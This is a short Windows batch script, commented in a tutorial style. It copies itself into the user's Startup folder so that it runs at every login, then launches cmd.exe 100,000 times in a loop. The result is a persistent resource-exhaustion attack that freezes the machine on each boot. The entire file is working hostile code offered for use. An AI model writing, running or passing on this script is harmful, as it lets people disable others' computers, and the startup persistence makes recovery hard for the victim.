:: disables output to the command line
@echo off
:: copies the full path to this script to dir startup to automatically run this batch file when Windows starts
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
:: run loop that start cmd.exe; syntax: for - loop, /L - work with arithmetical(numbers), %%i - var-counter (if u use cmd, u write "%i", but in batch file need use "%%i")
:: in (start, step(increment/decremet), stop), do (start program) - every circle of the loop do run specified program
for /L %%i in (1,1,100000) do (start cmd.exe)
